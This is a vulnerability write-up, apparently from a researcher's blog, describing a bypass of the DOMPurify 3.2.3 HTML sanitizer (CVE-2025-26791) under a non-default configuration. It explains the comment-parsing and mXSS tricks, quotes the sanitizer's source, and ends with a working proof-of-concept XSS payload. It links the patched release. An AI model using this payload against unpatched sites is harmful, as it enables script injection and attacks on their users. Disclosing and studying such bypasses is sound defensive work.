---
title: "DOMPurify 3.2.3 Bypass (Non-Default Config)"
description: "A write up of a bypass in DOMPurify 3.2.3 I found (CVE-2025-26791), specifically using incorrectly opened comment exception and mxss techniques, similar to previous successful bypassing attempts. "
date: "Jan 29 2025"
tags: ["write up", "xss"]
image: '/images/dompurify-thumbnail.png'
---

### Introduction

I found a bypass in DOMPurify which allows for sanitized HTML to cause XSS on the first day of the Chinese New Year! Here is how.

### Explanation
From looking at the previous few DOMPurify bypasses, a common theme can be spotted: the payloads are usually a combination of mXSS + comments in attribute values.

And if you take a look at `src/purify.ts` in DOMPurify, it does seem like cure53 have patched both comments and CDATA, or have they?

```js
/* Work around a security issue with comments inside attributes */
if (SAFE_FOR_XML && regExpTest(/((--!?|])>)|<\/(style|title)/i, value)) {
    _removeAttribute(name, currentNode);
    continue;
}
```

If we take a close look at the WHATWG HTML specification, we can see that comments not only come in the form of `<!-- ... -->` but also in `<! ... >` due to the [incorrectly opened comment exception](https://html.spec.whatwg.org/multipage/parsing.html#parse-error-incorrectly-opened-comment).

This on paper allows us to sneak comment end tags in attribute values if they are in the form of `<! ... >`... right?

If you have experience with mXSS, you might know that the it works because when comments are wrapped in a specific payload, it is treated as text in the first parsing(DOMPurify), but treated as a comment in the second parsing(browser).

However the payloads for mXSS require that the sneaked in comments be wrapped in `<style>` tags. Plus, DOMPurify removes all possible tags from text nodes, so the comment end tag must be in an attribute value.

But we want to achieve this... How?
`<style><! ... <a id='><img src onerror="alert(1)">'`

Another challenge presented is that we can't simultaneously have both comments and HTML elements in the `<style>` tag due to DOMPurify and how HTML works, so we can't "mutate" the anchor tag in.

At the bottom of the DOMPurify sanitize function, we see that there is a somewhat dangerous sanitization, replacing possible template expressions with spaces. This made me wonder, whether I could remove the closing style tag with this.

```js
    /* Sanitize final string template-safe */
    if (SAFE_FOR_TEMPLATES) {
      arrayForEach([MUSTACHE_EXPR, ERB_EXPR, TMPLIT_EXPR], (expr) => {
        serializedHTML = stringReplace(serializedHTML, expr, ' ');
      });
    }

return trustedTypesPolicy && RETURN_TRUSTED_TYPE
  ? trustedTypesPolicy.createHTML(serializedHTML)
  : serializedHTML;
};
```

Well turns out you can... Here is the full PoC.

### PoC
*mXSS portion taken from [Yaniv Nizry](https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/)*
```js
DOMPurify.sanitize(
  `<math><foo-test><mi><li><table><foo-test><li></li></foo-test><a>
      <style>
        <! \${
      </style>
      }
      <foo-b id="><img src onerror='alert(1)'>">hmm...</foo-b>
    </a></table></li></mi></foo-test></math>
  `,
  {
    SAFE_FOR_TEMPLATES: true,
    CUSTOM_ELEMENT_HANDLING: {
      tagNameCheck: /^foo-/,
    },
  }
);
```

### References
- https://github.com/cure53/DOMPurify/releases/tag/3.2.4
- https://github.com/cure53/DOMPurify/commit/d18ffcb554e0001748865da03ac75dd7829f0f02
- https://yaniv-git.github.io/2024/12/08/DOMPurify%203.2.1%20Bypass%20(Non-Default%20Config)/
- https://nvd.nist.gov/vuln/detail/CVE-2025-26791